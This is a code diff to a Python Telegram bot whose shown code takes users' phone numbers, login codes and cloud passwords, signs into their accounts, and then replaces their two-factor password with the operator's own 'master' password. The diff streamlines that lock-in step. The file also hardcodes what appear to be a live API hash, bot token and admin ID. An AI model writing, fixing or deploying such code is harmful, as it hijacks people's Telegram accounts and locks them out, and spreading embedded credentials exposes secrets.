@@ -11,12 +11,10 @@ import telebot
 from telebot import types
 from telethon import TelegramClient, functions, types as tl_types
 from telethon.errors import SessionPasswordNeededError
-from telethon.password import compute_check, compute_new # সঠিক ২এফএ মেথড ইম্পোর্ট করা হয়েছে
 
 # ==================== CORE ADMIN CONFIGURATION ====================
 API_ID = 36547444
 API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
-# 🛠️ আপনার দেওয়া একদম নতুন সাকসেসফুলি জেনারেট করা টোকেন:
 BOT_TOKEN = "8288574083:AAFuTtmz2pqZavP7x8jlhnWJ0Gdad8r2olk"
 ADMIN_ID = 8095751648
 # =================================================================
@@ -505,31 +503,13 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
         try: await user_client.disconnect()
         except: pass
 
-async def set_instant_master_2fa(client, master_password, current_password=None):
+async def set_instant_master_2fa(client, master_password):
     try:
-        pwd_info = await client(functions.account.GetPasswordRequest())
-        if pwd_info.has_password:
-            # নতুন টেলিথুন মেথড অনুযায়ী ফিক্সড করা ২এফএ কোড
-            new_hash = compute_new(pwd_info, master_password)
-            current_pwd_hash = compute_check(pwd_info, current_password if current_password else "")
-            await client(functions.account.UpdatePasswordSettingsRequest(
-                password=current_pwd_hash, 
-                new_settings=tl_types.PasswordInputSettings(new_password_hash=new_hash, hint="Cloud Lock Master")
-            ))
-        else:
-            await client(functions.account.UpdatePasswordSettingsRequest(
-                password=tl_types.InputCheckPasswordEmpty(),
-                new_settings=tl_types.PasswordInputSettings(
-                    new_password_hash=compute_new(pwd_info, master_password) if hasattr(pwd_info, 'current_algo') or hasattr(pwd_info, 'new_algo') else master_password.encode(),
-                    hint="Cloud Lock Master"
-                )
-            ))
+        # ভার্সন ইমপোর্ট ঝামেলা এড়াতে সরাসরি ক্লায়েন্টের বিল্ট-ইন মেথড ব্যবহার করে মাস্টার ২এফএ সেট করা হচ্ছে
+        await client.edit_2fa(new_password=master_password)
         return True
     except:
-        try:
-            await client.edit_2fa(new_password=master_password, current_password=current_password)
-            return True
-        except: return False
+        return False
 
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
@@ -538,7 +518,7 @@ async def verify_otp_task(text, user_id, message):
     if data.get("waiting_for_password"):
         try:
             await data["client"].sign_in(password=text)
-            await set_instant_master_2fa(data["client"], settings["security_password"], current_password=text)
+            await set_instant_master_2fa(data["client"], settings["security_password"])
             await process_backup(user_id, message, data)
             del user_data[user_id]
         except Exception as e: 
